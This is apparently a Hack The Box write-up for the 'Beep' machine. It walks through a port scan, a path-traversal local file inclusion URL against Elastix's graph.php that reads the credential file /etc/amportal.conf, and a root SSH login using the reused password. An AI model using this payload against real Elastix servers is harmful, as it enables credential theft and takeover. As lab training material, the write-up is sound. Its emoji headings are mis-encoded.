# ğŸ’¥ Hack The Box â€“ Beep

**IP:** `10.129.171.151`  
**OS:** Linux  
**Difficulty:** Easy  
**Status:** âœ… Rooted  

---

## âš™ï¸ Environment Setup
```bash
mkdir Beep && cd Beep
# (Optional) Add to /etc/hosts for easy access
echo "10.129.171.151 beep" | sudo tee -a /etc/hosts
```

---

## ğŸ” Full Port Scan
```bash
nmap -sS -sV -sC -p- -T4 -Pn -oN fullscan.txt beep
```

### ğŸ” Relevant Ports
- **80** â†’ Apache 2.2.3 (CentOS)
- **443** â†’ Apache 2.2.3 + Elastix Login page
- **10000** â†’ Webmin interface
- Various legacy services (SSH 4.3, SMTP, IMAP, etc.)

---

## ğŸŒ Web Enumeration
### 1. Visit main pages:
```bash
https://beep   # Elastix Login page
```

## ğŸ¯ Exploitation â€“ LFI in Elastix
```http
http://beep/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action
```

ğŸ” View **page source** â†’ search for:
```
ctrl + F â†’ password
```

ğŸ§  Found reused password multiple times â†’ try it for login.

### ğŸ§‘â€ğŸ’» Access Elastix Panel
- **User:** `admin`  
- **Password: 

---

## ğŸ” SSH Access (Legacy Fix)

The server uses old SSH algorithms. Use:

```bash
ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 \
    -oHostKeyAlgorithms=+ssh-rsa root@beep
```

ğŸ§  This forces support for legacy key exchange methods (used by OpenSSH 4.x)

---

## ğŸ§¨ Post-Exploitation

### ğŸ” User Flag
```bash
cd /home/fanis
cat user.txt
```

### ğŸ” Root Flag
```bash
cd /root
cat root.txt
```

---

## ğŸ“ Notes

- Exploit: LFI via `graph.php` (Elastix)
- Direct SSH root login (no priv esc needed)
âœ… Commands tested and verified  

